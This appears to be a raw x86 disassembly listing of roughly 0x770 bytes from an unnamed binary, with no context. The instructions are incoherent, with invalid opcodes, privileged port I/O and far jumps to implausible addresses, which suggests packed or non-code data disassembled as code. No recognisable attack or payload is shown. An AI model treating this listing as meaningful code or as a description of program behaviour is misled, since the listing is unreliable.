  41d7cf:	sar    DWORD PTR [eax+ecx*2+0x61a32f15],1
  41d7d6:	ret    
  41d7d7:	xchg   esi,eax
  41d7d8:	pavgw  mm6,QWORD PTR ds:0x5d675de0
  41d7df:	push   ss
  41d7e0:	call   0xe6f7119b
  41d7e5:	(bad)  
  41d7e6:	and    ebp,DWORD PTR [esi]
  41d7e8:	xchg   esi,eax
  41d7e9:	and    BYTE PTR [eax-0xee350c9],0xf5
  41d7f0:	mov    edi,0x29e4fee4
  41d7f5:	pop    esi
  41d7f6:	ja     0x41d7c6
  41d7f8:	mov    ebx,esi
  41d7fa:	loope  0x41d834
  41d7fc:	pop    ebx
  41d7fd:	stc    
  41d7fe:	cmp    eax,0xffc0c1c1
  41d803:	leave  
  41d804:	sbb    DWORD PTR [ebp+ebx*2+0x28],edx
  41d808:	jle    0x41d818
  41d80a:	mov    eax,0x83e2c77e
  41d80f:	loope  0x41d832
  41d811:	out    0x25,al
  41d813:	fld    TBYTE PTR [edx-0x8]
  41d816:	pop    ds
  41d817:	pop    eax
  41d818:	loope  0x41d7c0
  41d81a:	mov    edx,0x299a0cac
  41d81f:	in     eax,0x4b
  41d821:	mov    esi,0x8883bf9d
  41d826:	addr16 pop es
  41d828:	mov    ch,0xc9
  41d82a:	add    BYTE PTR [edi-0x65],0xb6
  41d82e:	pop    edi
  41d82f:	mov    ch,0x7a
  41d831:	icebp  
  41d832:	(bad)  
  41d833:	push   0xbe80dd7f
  41d838:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d839:	jb     0x41d8a5
  41d83b:	or     bh,BYTE PTR [esi-0x6ebcad8]
  41d841:	xor    DWORD PTR es:[edi-0x77],eax
  41d845:	jmp    DWORD PTR [esi]
  41d847:	fcomp  QWORD PTR ds:0xe07405ea
  41d84d:	nop
  41d84e:	or     eax,0x47df4be9
  41d853:	push   eax
  41d854:	ss stc 
  41d856:	test   esp,ebx
  41d858:	push   ecx
  41d859:	fwait
  41d85a:	dec    esi
  41d85b:	and    cl,BYTE PTR [esi+0x4f]
  41d85e:	inc    eax
  41d85f:	in     al,0x92
  41d861:	jl     0x41d857
  41d863:	add    al,0x8c
  41d865:	cmp    ecx,ebx
  41d867:	rcl    DWORD PTR [esi+ebp*8+0x49b52403],1
  41d86e:	shl    ebx,cl
  41d870:	inc    eax
  41d871:	cmp    edx,DWORD PTR [ebp-0x6b]
  41d874:	cdq    
  41d875:	loop   0x41d8b1
  41d877:	fisubr DWORD PTR [ebp+0x5a407968]
  41d87d:	call   0x9a88:0xab91402a
  41d884:	push   esi
  41d885:	hlt    
  41d886:	mov    al,0xef
  41d888:	xor    BYTE PTR [eax-0x48840f1f],dh
  41d88e:	xchg   edx,eax
  41d88f:	imul   edx,edi,0xffffffa0
  41d892:	mov    eax,ds:0xb8dad792
  41d897:	inc    ecx
  41d898:	in     eax,dx
  41d899:	mov    ds:0xb046ec03,eax
  41d89e:	in     eax,0x23
  41d8a0:	or     dh,BYTE PTR [edx+edi*2+0x4476ef72]
  41d8a7:	xor    al,0x3c
  41d8a9:	inc    edx
  41d8aa:	test   DWORD PTR ss:0xd41eaeba,0x3107b298
  41d8b5:	retf   
  41d8b6:	out    0x71,eax
  41d8b8:	push   0xb2cebd7c
  41d8bd:	mov    bh,0x94
  41d8bf:	xchg   DWORD PTR [edx-0x5c08a46a],esp
  41d8c5:	push   edi
  41d8c6:	js     0x41d8db
  41d8c8:	arpl   WORD PTR [edi*8-0x1a333665],sp
  41d8cf:	fidivr WORD PTR [edx+0xff71d2d]
  41d8d5:	inc    esi
  41d8d6:	inc    edi
  41d8d7:	lds    eax,FWORD PTR [edi+eiz*4-0x3e2d7828]
  41d8de:	xchg   ecx,esp
  41d8e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8e1:	ins    DWORD PTR es:[edi],dx
  41d8e2:	dec    ebp
  41d8e3:	xchg   edi,eax
  41d8e4:	retf   
  41d8e5:	js     0x41d94d
  41d8e7:	stc    
  41d8e8:	aad    0x28
  41d8ea:	jmp    0x41d87f
  41d8ec:	mov    DWORD PTR [edi-0x6946f060],edx
  41d8f2:	stos   BYTE PTR es:[edi],al
  41d8f3:	inc    ebx
  41d8f4:	jl     0x41d8cc
  41d8f6:	dec    esp
  41d8f7:	cmp    bl,BYTE PTR [ebx-0x79]
  41d8fa:	push   ds
  41d8fb:	out    dx,al
  41d8fc:	aam    0x57
  41d8fe:	cld    
  41d8ff:	mov    dh,0xd5
  41d901:	push   cs
  41d902:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d903:	das    
  41d904:	sub    DWORD PTR ds:0xcf5310fb,ebx
  41d90a:	mov    ebx,0xc20688a2
  41d90f:	xchg   ecx,eax
  41d910:	sbb    ah,bl
  41d912:	adc    ch,BYTE PTR [edi+0x6f53b80d]
  41d918:	call   0x59b1:0x1329d945
  41d91f:	add    DWORD PTR [edx],ebp
  41d921:	push   cs
  41d922:	jns    0x41d8a9
  41d924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d925:	mov    bh,BYTE PTR [eax-0x7c]
  41d928:	cwde   
  41d929:	pop    edx
  41d92a:	out    dx,eax
  41d92b:	jmp    0xd7faf625
  41d930:	push   0x2d
  41d932:	jmp    DWORD PTR [edx-0x14]
  41d935:	rcr    BYTE PTR [eax+0x0],0x11
  41d939:	sub    eax,0xeec9d25b
  41d93e:	jg     0x41d95c
  41d940:	inc    eax
  41d941:	add    ch,bl
  41d943:	sub    edx,eax
  41d945:	pop    eax
  41d946:	lea    eax,[ecx+0x6f]
  41d949:	or     cl,BYTE PTR [esi]
  41d94b:	lahf   
  41d94c:	fisubr DWORD PTR [ecx-0x47d6f0dd]
  41d952:	mov    cl,0xa6
  41d954:	jg     0x41d94f
  41d956:	xchg   esp,eax
  41d957:	and    BYTE PTR [esi-0x2318ec2],0x60
  41d95e:	pop    ds
  41d95f:	sar    cl,1
  41d961:	xor    al,0xac
  41d963:	pop    esi
  41d964:	adc    esi,DWORD PTR [esi+0x19]
  41d967:	fst    DWORD PTR ds:0x30215043
  41d96d:	xor    al,0xa3
  41d96f:	pop    edi
  41d970:	das    
  41d971:	xchg   esp,eax
  41d972:	sub    ah,BYTE PTR [ebp+0x77f1bf57]
  41d978:	mul    DWORD PTR [ecx]
  41d97a:	repz add ch,ch
  41d97d:	jg     0xdc72070f
  41d983:	xchg   edx,eax
  41d984:	sbb    DWORD PTR es:[eax-0x39865477],0x55
  41d98c:	xlat   BYTE PTR ds:[ebx]
  41d98d:	call   0x2ccc:0xdd1c18c1
  41d994:	stos   DWORD PTR es:[edi],eax
  41d995:	aam    0x43
  41d997:	add    ch,BYTE PTR [esp+esi*8]
  41d99a:	jl     0x41d9b9
  41d99c:	(bad)  
  41d99d:	sar    BYTE PTR [eax+eiz*2-0x101c6f20],1
  41d9a4:	iret   
  41d9a5:	mov    bh,0x7b
  41d9a7:	push   edi
  41d9a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9a9:	and    bl,BYTE PTR [edi*2-0x2afbfafe]
  41d9b0:	fwait
  41d9b1:	gs scas al,BYTE PTR es:[edi]
  41d9b3:	out    dx,al
  41d9b4:	push   esp
  41d9b5:	jno    0x41d9e4
  41d9b7:	inc    esp
  41d9b8:	aas    
  41d9b9:	mov    bl,0xf4
  41d9bb:	mov    bl,0x9d
  41d9bd:	sbb    al,0xb2
  41d9bf:	loop   0x41d9dc
  41d9c1:	(bad)  
  41d9c2:	jns    0x41d9fc
  41d9c4:	add    DWORD PTR [ebx],ebp
  41d9c6:	pusha  
  41d9c7:	rol    cl,cl
  41d9c9:	in     eax,dx
  41d9ca:	test   eax,0x2a819866
  41d9cf:	mov    dh,0x9e
  41d9d1:	xor    eax,0xe0a46d69
  41d9d6:	sahf   
  41d9d7:	lock xor DWORD PTR [eax],ecx
  41d9da:	fwait
  41d9db:	cli    
  41d9dc:	mov    bl,0x16
  41d9de:	jne    0x41d97c
  41d9e0:	leave  
  41d9e1:	xchg   ecx,eax
  41d9e2:	or     al,0x4d
  41d9e4:	xchg   ebp,ebp
  41d9e6:	push   esp
  41d9e7:	rcr    BYTE PTR [edx-0x47474aec],cl
  41d9ed:	stos   DWORD PTR es:[edi],eax
  41d9ee:	cld    
  41d9ef:	sti    
  41d9f0:	mov    ebx,0x5fa6aefb
  41d9f5:	push   0xdccdc0df
  41d9fa:	pop    edi
  41d9fb:	dec    ecx
  41d9fc:	sub    al,0xf1
  41d9fe:	ja     0x41da38
  41da00:	sub    DWORD PTR [eax+0x4e],ebx
  41da03:	mov    ecx,ebx
  41da05:	test   BYTE PTR [edi-0xe],bh
  41da08:	inc    eax
  41da09:	fist   DWORD PTR [esi-0x59c203e0]
  41da0f:	xchg   edi,eax
  41da10:	mov    bh,0x49
  41da12:	or     al,0xcc
  41da14:	sar    DWORD PTR [ecx-0x6b],1
  41da17:	jl     0x41d9f2
  41da19:	mov    bh,0xab
  41da1b:	daa    
  41da1c:	jae    0x41d9e3
  41da1e:	fs push eax
  41da20:	ins    DWORD PTR es:[edi],dx
  41da21:	sub    DWORD PTR [edi],ebx
  41da23:	or     eax,0x3126afe6
  41da28:	and    al,0xca
  41da2a:	lea    esi,[esp+ebx*2+0x7a]
  41da2e:	cs cmp al,0x30
  41da31:	les    ebx,FWORD PTR [edx]
  41da33:	ror    DWORD PTR [esi+0x20],1
  41da36:	inc    eax
  41da37:	mov    al,0x7a
  41da39:	push   es
  41da3a:	or     dh,0xdc
  41da3d:	shl    DWORD PTR [edi],0x1d
  41da40:	out    0xdf,eax
  41da42:	add    BYTE PTR [ebp-0x2fa1fc02],al
  41da48:	inc    ecx
  41da49:	sbb    ch,BYTE PTR [ecx-0xe8e5dcf]
  41da4f:	or     al,0x6e
  41da51:	or     DWORD PTR [esi],esp
  41da53:	daa    
  41da54:	(bad)  
  41da55:	std    
  41da56:	pop    esp
  41da57:	in     al,0x1f
  41da59:	mov    ebp,0x18e527eb
  41da5e:	jae    0x41da18
  41da60:	sti    
  41da61:	popf   
  41da62:	xor    BYTE PTR [ebx],0x1c
  41da65:	mov    edx,0x34210ae6
  41da6a:	adc    ch,BYTE PTR [ebp+0x66874480]
  41da70:	ret    
  41da71:	je     0x41dada
  41da73:	mov    fs,WORD PTR ss:[edx+eiz*1-0x74]
  41da78:	retf   
  41da79:	out    0xc8,al
  41da7b:	adc    BYTE PTR [ebx],bh
  41da7d:	and    esp,DWORD PTR [eax+0x5c]
  41da80:	mov    eax,0xaf611cf6
  41da85:	js     0x41da23
  41da87:	test   al,0xc5
  41da89:	ins    BYTE PTR es:[edi],dx
  41da8a:	scas   al,BYTE PTR es:[edi]
  41da8b:	neg    BYTE PTR [ebp-0x316c9cc9]
  41da91:	cmp    al,0xa3
  41da93:	ds mov ebp,0x9b93f731
  41da99:	ret    
  41da9a:	rcl    DWORD PTR [ebx-0x60],cl
  41da9d:	fild   DWORD PTR [ebx]
  41da9f:	test   DWORD PTR [esi],ebx
  41daa1:	aas    
  41daa2:	mov    eax,ds:0x13fd7244
  41daa7:	xchg   esi,eax
  41daa8:	sub    DWORD PTR [eax-0x62],ebx
  41daab:	sub    DWORD PTR [edx+0x39],eax
  41daae:	pop    ebp
  41daaf:	adc    DWORD PTR [ebx],edx
  41dab1:	push   eax
  41dab2:	or     BYTE PTR [edx+ecx*1-0x29],ch
  41dab6:	mov    bh,0xe0
  41dab8:	and    al,0x28
  41daba:	scas   eax,DWORD PTR es:[edi]
  41dabb:	sub    BYTE PTR [esi+eax*8],al
  41dabe:	push   edi
  41dabf:	add    eax,0x96f10046
  41dac4:	or     DWORD PTR [ebp+0x1d],ebx
  41dac7:	cmp    eax,0x1a5e1af9
  41dacc:	mov    ds:0xd180086a,eax
  41dad1:	adc    bl,BYTE PTR gs:[eax-0x2a553b2c]
  41dad8:	fnstsw WORD PTR ds:0x35d822cf
  41dade:	mov    dl,0x3f
  41dae0:	or     ebx,DWORD PTR [edx+0x27476904]
  41dae6:	xchg   esi,eax
  41dae7:	inc    ecx
  41dae8:	sbb    dl,dl
  41daea:	and    edx,0x9fffd690
  41daf0:	or     ecx,DWORD PTR [eax]
  41daf2:	aam    0x6e
  41daf4:	stc    
  41daf5:	loop   0x41db1d
  41daf7:	test   eax,0xad7a80b1
  41dafc:	ins    BYTE PTR es:[edi],dx
  41dafd:	fstp   TBYTE PTR [ebp+0x73]
  41db00:	dec    esp
  41db01:	jno    0x41db60
  41db03:	(bad)  
  41db04:	gs retf 0x681
  41db08:	mov    edx,0xab137cdc
  41db0d:	fdiv   QWORD PTR [edi-0x7d]
  41db10:	mov    al,ds:0x149b05f8
  41db15:	shl    DWORD PTR [edx+0xb1a150],0x12
  41db1c:	shl    BYTE PTR [edi-0x16],1
  41db1f:	std    
  41db20:	sbb    al,0x47
  41db22:	popa   
  41db23:	pop    ss
  41db24:	jmp    0xc7a6c9ce
  41db29:	and    DWORD PTR [edx-0x16],esi
  41db2c:	out    0xfd,eax
  41db2e:	pop    esp
  41db2f:	inc    esp
  41db30:	test   al,0x69
  41db33:	mov    ds:0xa3fbb70,al
  41db38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db39:	lahf   
  41db3a:	inc    ebp
  41db3b:	mov    edx,0x5b81b315
  41db40:	shl    DWORD PTR [edi-0x1350bbd1],cl
  41db46:	sbb    bh,bl
  41db48:	sar    BYTE PTR [ecx],1
  41db4a:	xchg   edi,eax
  41db4b:	inc    ecx
  41db4c:	or     DWORD PTR [esi],0xffffffce
  41db4f:	push   ds
  41db50:	(bad)  
  41db51:	stos   BYTE PTR es:[edi],al
  41db52:	cmc    
  41db53:	adc    eax,0x14
  41db56:	iret   
  41db57:	je     0x41db94
  41db59:	(bad)
  41db5c:	push   0xe593b2ab
  41db61:	cmp    bh,BYTE PTR [ebx]
  41db63:	jbe    0x41dbe4
  41db65:	in     al,dx
  41db66:	(bad)  
  41db67:	sbb    dh,BYTE PTR [eax+0xa]
  41db6a:	xlat   BYTE PTR ds:[ebx]
  41db6b:	fiadd  WORD PTR [edx]
  41db6d:	sahf   
  41db6e:	comiss xmm0,DWORD PTR [eax]
  41db71:	aas    
  41db72:	or     BYTE PTR [edx],0x96
  41db75:	cdq    
  41db76:	and    dh,cl
  41db78:	xchg   ebp,eax
  41db79:	dec    ecx
  41db7a:	lea    ebp,[ebx]
  41db7c:	xchg   esp,eax
  41db7d:	jbe    0x41dba2
  41db7f:	mov    BYTE PTR [edi],ah
  41db81:	cld    
  41db82:	mov    esi,?
  41db84:	dec    edx
  41db85:	mov    DWORD PTR [ebp-0x25178121],esp
  41db8b:	xchg   ebx,eax
  41db8c:	jb     0x41dbdd
  41db8e:	stos   BYTE PTR es:[edi],al
  41db8f:	je     0x41dc0b
  41db91:	retf   0xfdbc
  41db94:	loope  0x41db5c
  41db96:	scas   al,BYTE PTR es:[edi]
  41db97:	sbb    eax,0x733beba2
  41db9c:	js     0x41dc13
  41db9e:	js     0x41db57
  41dba0:	inc    esi
  41dba1:	imul   edx,DWORD PTR [ebx+0x3f00f982],0xffffffbb
  41dba8:	loop   0x41dbb6
  41dbaa:	(bad)  
  41dbac:	loopne 0x41db52
  41dbae:	push   0x44e0747e
  41dbb3:	fwait
  41dbb4:	xor    edx,ecx
  41dbb6:	push   eax
  41dbb7:	scas   eax,DWORD PTR es:[edi]
  41dbb8:	fdiv   st,st(0)
  41dbba:	call   0xe305:0xc966d210
  41dbc1:	fidivr DWORD PTR [esi-0x2e0990c]
  41dbc7:	jno    0x41db7c
  41dbc9:	or     ebp,edx
  41dbcb:	mov    ch,0x6b
  41dbcd:	cmp    DWORD PTR [ecx+0x2e],edi
  41dbd0:	mov    eax,es
  41dbd2:	add    edx,edi
  41dbd4:	push   esp
  41dbd5:	scas   eax,DWORD PTR es:[edi]
  41dbd6:	aas    
  41dbd7:	scas   al,BYTE PTR es:[edi]
  41dbd8:	sbb    ebp,DWORD PTR [ebx+0x16]
  41dbdb:	or     DWORD PTR [ecx],0x7c
  41dbde:	fidiv  DWORD PTR [ecx]
  41dbe0:	pop    ds
  41dbe1:	mov    bh,0x62
  41dbe3:	add    bl,ch
  41dbe5:	enter  0x1203,0x36
  41dbe9:	fstp   DWORD PTR [ecx]
  41dbeb:	pop    ds
  41dbec:	sub    DWORD PTR [ebp+0x76dbe5c3],edx
  41dbf2:	cld    
  41dbf3:	adc    eax,0x5385d67b
  41dbf8:	out    dx,al
  41dbf9:	popf   
  41dbfa:	outs   dx,BYTE PTR ds:[esi]
  41dbfb:	sub    eax,0xc6fa20ff
  41dc00:	cli    
  41dc01:	out    0x85,eax
  41dc03:	dec    ecx
  41dc04:	xchg   esp,eax
  41dc05:	aaa    
  41dc06:	in     eax,0x55
  41dc08:	je     0x41dc24
  41dc0a:	pop    ebp
  41dc0b:	or     BYTE PTR [eax],ch
  41dc0d:	cld    
  41dc0e:	jmp    0xe4d9:0xa116ee97
  41dc15:	lods   eax,DWORD PTR ds:[esi]
  41dc16:	pop    esi
  41dc17:	jl     0x41dbfc
  41dc19:	add    bl,BYTE PTR [eax]
  41dc1b:	push   edx
  41dc1c:	inc    esi
  41dc1d:	data16 mov bl,0x37
  41dc20:	push   ss
  41dc21:	xor    bh,cl
  41dc23:	jl     0x41dc9a
  41dc25:	mov    DWORD PTR [edi],esp
  41dc27:	xor    al,0x7c
  41dc29:	jmp    0xc565:0x59c9a573
  41dc30:	and    ebx,DWORD PTR [eax+eax*1]
  41dc33:	outs   dx,DWORD PTR ds:[esi]
  41dc34:	loop   0x41dc07
  41dc36:	call   0xcfec12bc
  41dc3b:	dec    esp
  41dc3c:	cli    
  41dc3d:	lea    esp,[eax]
  41dc3f:	cmp    al,0x62
  41dc41:	inc    ecx
  41dc42:	ret    0xd237
  41dc45:	ret    0x6d06
  41dc48:	es aaa 
  41dc4a:	das    
  41dc4b:	repz jge 0x41dc84
  41dc4e:	push   eax
  41dc4f:	push   eax
  41dc50:	js     0x41dc9d
  41dc52:	sub    ah,BYTE PTR [eax*1-0x289b8c85]
  41dc59:	dec    ebx
  41dc5a:	push   0xb051da44
  41dc5f:	sbb    eax,eax
  41dc61:	out    0x3a,eax
  41dc63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc64:	pop    ebp
  41dc65:	sub    ch,BYTE PTR [edi+0x22]
  41dc68:	jle    0x41dcc7
  41dc6a:	out    dx,eax
  41dc6b:	adc    ebp,DWORD PTR [edi-0xc]
  41dc6e:	mov    bh,0xbf
  41dc70:	das    
  41dc71:	nop
  41dc72:	sub    al,0x0
  41dc74:	inc    edx
  41dc75:	mov    ebp,0x79111c1d
  41dc7a:	sar    bh,cl
  41dc7c:	push   es
  41dc7d:	test   BYTE PTR [ecx-0x523a1cf9],cl
  41dc83:	cmp    eax,0x6da1e524
  41dc88:	or     ah,bl
  41dc8a:	les    esi,FWORD PTR [esi+0x1f]
  41dc8d:	adc    dh,BYTE PTR [edi+0x46e07d04]
  41dc93:	push   esi
  41dc94:	dec    ecx
  41dc95:	and    eax,0xc3478abc
  41dc9a:	(bad)  
  41dc9b:	cmc    
  41dc9c:	leave  
  41dc9d:	sbb    DWORD PTR [edi],ebx
  41dc9f:	pop    ebp
  41dca0:	dec    esi
  41dca1:	rcr    al,0xa7
  41dca4:	gs int3 
  41dca6:	test   BYTE PTR [ebx-0x2e],dl
  41dca9:	cmp    BYTE PTR [esi+0x7c3781a4],0x31
  41dcb0:	or     al,0x42
  41dcb2:	mov    bh,0x3
  41dcb4:	push   0xffffffc7
  41dcb6:	xor    BYTE PTR [edx],al
  41dcb8:	es test DWORD PTR ss:[ebp-0x1145a5ae],ecx
  41dcc0:	es push eax
  41dcc2:	test   al,0x12
  41dcc4:	mov    ch,0x58
  41dcc6:	ficom  WORD PTR [edx+edi*4]
  41dcc9:	test   BYTE PTR [esi+0x62],dl
  41dccc:	mov    eax,ecx
  41dcce:	mov    ecx,0xc4ab588d
  41dcd3:	retf   
  41dcd4:	and    BYTE PTR ds:0x50a07434,0x9b
  41dcdb:	mov    al,ds:0x9f16a36
  41dce0:	ret    
  41dce1:	add    BYTE PTR [eax-0x2f],dl
  41dce4:	mov    bh,BYTE PTR [eax+0x2e]
  41dce7:	mov    ebx,0xf23c1774
  41dcec:	pop    esp
  41dced:	out    0xaf,eax
  41dcef:	and    DWORD PTR [edx+0x408ecf8d],eax
  41dcf5:	xlat   BYTE PTR ds:[ebx]
  41dcf6:	call   0x82288179
  41dcfb:	sub    esp,DWORD PTR [eax]
  41dcfd:	add    al,0x7a
  41dcff:	push   ebx
  41dd00:	pop    ebp
  41dd01:	cmp    ch,BYTE PTR [esi+0x5797c5e5]
  41dd07:	or     al,0x91
  41dd09:	jo     0x41dd6b
  41dd0b:	inc    esi
  41dd0c:	xlat   BYTE PTR ds:[ebx]
  41dd0d:	dec    esi
  41dd0e:	pusha  
  41dd0f:	add    bh,al
  41dd11:	call   FWORD PTR [ebp+ecx*8+0x5b]
  41dd15:	add    eax,0x6de73c4e
  41dd1a:	xchg   ebx,eax
  41dd1b:	push   esp
  41dd1c:	add    eax,0x34f42611
  41dd21:	call   0xd26b:0xdd026fa4
  41dd28:	or     eax,0xc8ed0d7d
  41dd2d:	sub    al,0x6a
  41dd2f:	imul   esi,DWORD PTR [ecx-0x3075265e],0x37db132
  41dd39:	add    dh,bh
  41dd3b:	inc    edx
  41dd3c:	jb     0x41dd64
  41dd3e:	and    BYTE PTR [eax-0xa440588],dh
  41dd44:	push   edi
  41dd45:	inc    edx
  41dd46:	pop    ecx
  41dd47:	dec    eax
  41dd48:	stos   BYTE PTR es:[edi],al
  41dd49:	out    dx,al
  41dd4a:	test   DWORD PTR [esp+ecx*2+0x79],esp
  41dd4e:	mov    esi,0x1815c5dd
  41dd53:	mov    ch,0x84
  41dd55:	(bad)  
  41dd56:	sbb    DWORD PTR [esi-0x4a9f0905],ecx
  41dd5c:	jp     0x41ddd0
  41dd5e:	pop    esi
  41dd5f:	mov    ds:0x40720813,al
  41dd64:	ss push cs
  41dd66:	retf   
  41dd67:	dec    edx
  41dd68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd69:	cmp    eax,0xbf8f5e6
  41dd6e:	sbb    BYTE PTR [eax],bh
  41dd70:	sub    dh,BYTE PTR [ecx-0x59159df6]
  41dd76:	inc    edx
  41dd77:	mov    BYTE PTR [ebp+0x2e],bh
  41dd7a:	xor    BYTE PTR [ecx-0x45bf43f9],dl
  41dd80:	retf   
  41dd81:	ss mov dh,0x46
  41dd84:	cmp    DWORD PTR [ecx-0x27],ebx
  41dd87:	pmulhuw xmm7,XMMWORD PTR [edx+ebx*1-0x40]
  41dd8d:	jnp    0x41ddb6
  41dd8f:	dec    ebp
  41dd90:	fwait
  41dd91:	pop    ds
  41dd92:	fxch   st(7)
  41dd94:	imul   edi,DWORD PTR [esi+0xd3f6d98],0x84a18070
  41dd9e:	mov    dh,BYTE PTR [eax-0x5c]
  41dda1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dda2:	or     eax,0xe485643b
  41dda7:	mov    ebx,0xb1b4c9df
  41ddac:	or     DWORD PTR [ebp+0x13],ebp
  41ddaf:	stc    
  41ddb0:	lods   eax,DWORD PTR ds:[esi]
  41ddb1:	dec    ch
  41ddb3:	ds loop 0x41dd73
  41ddb6:	jle    0x41dd81
  41ddb8:	jne    0x41dd84
  41ddba:	dec    esi
  41ddbb:	mov    ebx,0x9c7a971f
  41ddc0:	push   cs
  41ddc1:	jg     0x41dd8a
  41ddc3:	shr    BYTE PTR gs:[ebx],1
  41ddc6:	xchg   edi,eax
  41ddc7:	fiadd  WORD PTR [eax+0x7d3a2b70]
  41ddcd:	cli    
  41ddce:	ins    DWORD PTR es:[edi],dx
  41ddcf:	enter  0x7286,0x9b
  41ddd3:	scas   al,BYTE PTR es:[edi]
  41ddd4:	outs   dx,BYTE PTR ds:[si]
  41ddd6:	cmp    dh,dh
  41ddd8:	lods   al,BYTE PTR ds:[esi]
  41ddd9:	or     al,0x4d
  41dddb:	and    al,0xc0
  41dddd:	push   eax
  41ddde:	mov    ch,0x86
  41dde0:	xchg   ecx,eax
  41dde1:	pop    ds
  41dde2:	add    eax,0x2e42a06b
  41dde7:	dec    edx
  41dde8:	add    al,0xd1
  41ddea:	inc    ebp
  41ddeb:	fsubp  st(4),st
  41dded:	shl    esp,0x8c
  41ddf0:	rol    BYTE PTR [ebp-0x63f75b0d],1
  41ddf6:	xlat   BYTE PTR ds:[ebx]
  41ddf7:	dec    DWORD PTR [ebp+esi*8+0x7e]
  41ddfb:	sbb    al,0xc
  41ddfd:	add    bh,BYTE PTR [ecx+0x5cb8c1b5]
  41de03:	in     al,dx
  41de04:	mov    cl,0xb1
  41de06:	daa    
  41de07:	push   edi
  41de08:	imul   ebx,DWORD PTR ds:0xeaeab42f,0x401902ed
  41de12:	push   ds
  41de13:	pop    ss
  41de14:	ss lahf 
  41de16:	int3   
  41de17:	test   DWORD PTR [edx+0x15f2e7ea],ebx
  41de1d:	push   edx
  41de1e:	cmp    al,0x1f
  41de20:	and    esi,DWORD PTR [ebp+0x4b8d04dc]
  41de26:	outs   dx,BYTE PTR ds:[esi]
  41de27:	mov    dl,0x3a
  41de29:	and    DWORD PTR [eax+0x1f793ea3],ebx
  41de2f:	sahf   
  41de30:	mov    esp,0x9033b40d
  41de35:	int    0x6b
  41de37:	xor    BYTE PTR [edi-0x6e2f76aa],bl
  41de3d:	xor    DWORD PTR [ebx+edx*2-0x240d74fb],edi
  41de44:	push   edi
  41de45:	stos   BYTE PTR es:[edi],al
  41de46:	jbe    0x41dea0
  41de48:	loop   0x41de71
  41de4a:	pop    ebp
  41de4b:	out    0x75,eax
  41de4d:	add    ch,BYTE PTR [ebx]
  41de4f:	iret   
  41de50:	xchg   edi,eax
  41de51:	les    ecx,FWORD PTR [edi-0x53]
  41de54:	adc    eax,0xc0d15e52
  41de59:	jmp    0xa7e2590b
  41de5e:	sahf   
  41de5f:	cmp    eax,0x593fda0b
  41de64:	inc    esp
  41de65:	pop    ss
  41de66:	in     eax,dx
  41de67:	jbe    0x41de64
  41de69:	test   eax,0x1215d504
  41de6e:	inc    esp
  41de6f:	mov    edi,0xeb0e330d
  41de74:	aas    
  41de75:	or     dh,BYTE PTR [eax+0x446affd2]
  41de7b:	pop    eax
  41de7c:	xchg   dl,ah
  41de7e:	out    0x60,al
  41de80:	rol    BYTE PTR [edx-0x72],1
  41de83:	sub    cl,BYTE PTR [ebx+0x5a4275f5]
  41de89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de8a:	push   0x11
  41de8c:	lods   eax,DWORD PTR ds:[esi]
  41de8e:	mov    ?,eax
  41de90:	aam    0xca
  41de92:	cs dec edx
  41de94:	xor    DWORD PTR [ebp+eiz*2-0x22a26df],ecx
  41de9b:	pop    esi
  41de9c:	sub    eax,0x61d9db31
  41dea1:	mov    bl,0xb4
  41dea3:	add    DWORD PTR [eax+0x7],ebp
  41dea6:	jb     0x41ded7
  41dea8:	std    
  41dea9:	aas    
  41deaa:	pop    edi
  41deab:	fwait
  41deac:	adc    eax,0x459190e9
  41deb1:	clc    
  41deb2:	push   ebx
  41deb3:	int3   
  41deb4:	fist   DWORD PTR [edx+eiz*2-0x38]
  41deb8:	cmp    eax,0x9c76e5cf
  41debd:	jmp    0x41df04
  41debf:	adc    BYTE PTR [esi+0x77],0x2f
  41dec3:	push   ss
  41dec4:	fiadd  WORD PTR [esi-0x6f]
  41dec7:	rol    BYTE PTR [ebx-0x63],0xa9
  41decb:	loopne 0x41decd
  41decd:	pop    eax
  41dece:	popa   
  41decf:	sar    DWORD PTR [ecx],1
  41ded1:	outs   dx,BYTE PTR ds:[esi]
  41ded2:	mov    eax,ds:0xef53cd94
  41ded7:	and    DWORD PTR [ebp-0x52],0x6722e3e5
  41dede:	xor    esi,DWORD PTR [eax-0x2e]
  41dee1:	test   DWORD PTR ds:0xcd94c503,eax
  41dee7:	push   cs
  41dee8:	lods   eax,DWORD PTR ds:[esi]
  41dee9:	ss clc 
  41deeb:	sub    BYTE PTR [edx+0x1b],ch
  41deee:	jl     0x41ded2
  41def0:	rcr    bl,cl
  41def2:	push   0xffffffe8
  41def4:	ins    DWORD PTR es:[edi],dx
  41def5:	xor    dh,ah
  41def7:	jbe    0x41df44
  41def9:	and    DWORD PTR [ebp+0x3f162844],ecx
  41deff:	inc    ecx
  41df00:	scas   eax,DWORD PTR es:[edi]
  41df01:	or     BYTE PTR [ebx+0x568c9c6e],dh
  41df07:	test   al,0xc7
  41df09:	push   cs
  41df0a:	loop   0x41deb9
  41df0c:	adc    eax,0x23fdb8c5
  41df11:	add    ebx,esi
  41df13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df14:	inc    ecx
  41df15:	mov    BYTE PTR [edx+0x53],0x73
  41df19:	out    dx,al
  41df1a:	cmp    al,0x90
  41df1c:	add    ebp,DWORD PTR [esi-0x149c555e]
  41df22:	mov    edi,0xe4a95db
  41df27:	inc    edi
  41df28:	jns    0x41df5f
  41df2a:	rcr    esp,1
  41df2c:	mov    BYTE PTR [ecx+ecx*4],dl
  41df2f:	daa    
  41df30:	pop    eax
  41df31:	std    
  41df32:	mov    edx,0xf9cecb2f
  41df37:	fdivr  DWORD PTR [ebx-0x6a]
  41df3a:	cmp    DWORD PTR [ecx],esp
  41df3c:	xchg   edx,eax
  41df3d:	out    dx,al
  41df3e:	fdiv   st,st(3)
  41df40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df41:	xchg   ebp,eax
  41df42:	or     bl,BYTE PTR [eax+0x2e39f31b]
